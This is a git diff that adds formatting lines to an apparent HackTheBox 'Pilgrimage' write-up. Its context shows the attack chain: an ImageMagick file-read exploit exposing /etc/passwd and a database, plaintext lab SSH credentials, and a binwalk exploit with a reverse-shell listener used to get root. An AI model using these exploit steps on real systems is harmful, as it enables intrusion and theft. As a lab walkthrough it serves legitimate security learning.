@@ -33,6 +33,7 @@ PORT   STATE SERVICE VERSION
 |_http-server-header: nginx/1.18.0
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 ```
+{: .nolineno}
 
 ## Web Enumeration ⤵️
 
@@ -61,6 +62,7 @@ Warning: Destination '.' is not empty
 [-] Fetching http://pilgrimage.htb/.git/hooks/pre-applypatch.sample [200]
 ...
 ```
+{: .nolineno}
 
 Now on git directory I got different files ⤵️
 
@@ -69,6 +71,7 @@ Now on git directory I got different files ⤵️
 └─$ ls
 assets  dashboard.php  index.php  login.php  logout.php  magick  register.php  vendor
 ```
+{: .nolineno}
 
 I saw `magick` which is used in editing images so lets enum further :
 
@@ -82,6 +85,7 @@ Features: Cipher DPC HDRI OpenMP(4.5)
 Delegates (built-in): bzlib djvu fontconfig freetype jbig jng jpeg lcms lqr lzma openexr png raqm tiff webp x xml zlib
 Compiler: gcc (7.5)
 ```
+{: .nolineno}
 
 Now lets find an exploit for this and I got it which I wanted ⤵️
 
@@ -102,6 +106,7 @@ poc.py: error: the following arguments are required: action
 └─$ ls -al passwd.png 
 -rw-r--r-- 1 kali kali 181 Sep  8 11:43 passwd.png
 ```
+{: .nolineno}
 
 Now lets upload this payload png file into the site and lets download the shrink image which we get after uploading this image ⤵️
 
@@ -123,6 +128,7 @@ Saving to: ‘64fabc0bacede.png’
 
 2023-09-08 11:47:01 (44.5 MB/s) - ‘64fabc0bacede.png’ saved [1082/1082]
 ```
+{: .nolineno}
 
 Now lets read our `/etc/passwd` payload that we imbedded into the exploit image passwd.png ⤵️
 
@@ -168,6 +174,7 @@ systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
 sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
 _laurel:x:998:998::/var/log/laurel:/bin/false
 ```
+{: .nolineno}
 
 Now I got the output of /etc/passwd file as LFI so lets try to get a shell from this ->
 
@@ -201,6 +208,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && $_POST['username'] && $_POST['passw
 }
 ?>
 ```
+{: .nolineno}
 
 Now lets acccess this file with previous method as we got /etc/passwd file ⤵️
 
@@ -288,6 +296,7 @@ Image: 64faea203f664.png
   Elapsed Time: 0m:0.000322s
   Pixels Per Second: 75.8Ki
 ```
+{: .nolineno}
 
 here I used the cyberchef tool to decode this much hex output into a sqlite format ⤵️
 
@@ -302,6 +311,7 @@ Now I have the credentials ⤵️
 ```bash
 emily : abigchonkyboi123
 ```
+{: .nolineno}
 
 ## SSH Login ⤵️
 
@@ -321,6 +331,7 @@ Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
 permitted by applicable law.
 emily@pilgrimage:~$
 ```
+{: .nolineno}
 
 got the user.txt file ⤵️
 
@@ -329,6 +340,7 @@ emily@pilgrimage:~$ cat user.txt
 b3e8c829c80641db2b04cce05a39febe
 emily@pilgrimage:~$
 ```
+{: .nolineno}
 
 Now while checking the processes I Noticed this file ->
 
@@ -358,6 +370,7 @@ emily@pilgrimage:/$ ls -al /usr/sbin/malwarescan.sh
 -rwxr--r-- 1 root root 474 Jun  1 19:14 /usr/sbin/malwarescan.sh
 emily@pilgrimage:/$
 ```
+{: .nolineno}
 
 Here this program is running binwalk so lets check which version of binwalk it is using ⤵️
 
@@ -375,6 +388,7 @@ Signature Scan Options:
     -R, --raw=<str>              Scan target file(s) for the specified sequence of bytes
 ...
 ```
+{: .nolineno}
 
 Since it is version 2.3.2 and from web I got an exploit of this version only so lets try it out this exploit ⤵️ https://www.exploit-db.com/exploits/51249
 
@@ -407,6 +421,7 @@ systemd-private-4dfeccbe37e14f1094cda99040197a4d-systemd-timesyncd.service-JCrdO
 vmware-root_581-3979839684
 emily@pilgrimage:/tmp$
 ```
+{: .nolineno}
 
 Now lets copy this binwalk_exploit.png into the images location that is `/var/www/pilgrimage.htb/shrunk/` ⤵️
 
@@ -414,6 +429,7 @@ Now lets copy this binwalk_exploit.png into the images location that is `/var/ww
 emily@pilgrimage:/tmp$ cp binwalk_exploit.png /var/www/pilgrimage.htb/shrunk/
 emily@pilgrimage:/tmp$
 ```
+{: .nolineno}
 
 Now in attackers machine lets start the Listener on port 4444 ⤵️
 
@@ -462,6 +478,7 @@ ip a
        valid_lft forever preferred_lft forever
 root@pilgrimage:~#
 ```
+{: .nolineno}
 
 I got the root !!
 
